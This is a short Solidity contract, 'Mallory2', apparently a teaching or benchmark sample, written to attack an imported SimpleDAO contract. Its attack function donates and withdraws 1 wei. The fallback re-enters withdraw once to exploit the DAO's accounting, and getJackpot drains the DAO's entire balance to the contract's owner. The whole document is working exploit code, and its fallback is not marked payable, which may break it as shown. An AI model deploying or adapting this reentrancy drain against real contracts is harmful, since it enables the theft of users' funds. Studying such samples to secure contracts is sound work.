pragma solidity 0.7.6;

import "./SimpleDAO.sol";

contract Mallory2 {
    SimpleDAO public dao;
    address payable owner;
    bool performAttack = true;

    constructor(
        address _daoAddress
    ) {
        dao = SimpleDAO(_daoAddress);
        owner = msg.sender;
    }

    function attack() public {
        dao.donate{value: 1}(address(this));
        dao.withdraw(1);
    }

    fallback() external {
        if(performAttack) {
            performAttack = false;
            dao.withdraw(1);
        }
    }

    function getJackpot() public {
        dao.withdraw(address(dao).balance);
        owner.send(address(this).balance);
    }
}